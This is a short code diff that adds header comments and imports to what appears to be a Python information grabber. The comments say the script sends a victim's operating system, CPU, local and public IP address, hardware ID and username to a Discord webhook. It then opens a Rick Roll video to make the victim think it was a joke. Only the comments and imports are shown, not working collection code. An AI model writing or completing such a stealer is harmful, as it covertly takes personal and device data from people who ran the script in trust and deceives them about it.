@@ -1,3 +1,13 @@
+#This will get the end user's information and display it to your discord webhook as;
+#The operating system is:
+#The CPU is:
+#The IP address is: 
+#The public IP address is: 
+#The HWID is:
+#The username is: 
+
+#It will then open a web browser and send them to youtube Rick Roll to hopefully make them think it was a joke.
+
 import uuid
 import socket
 import requests
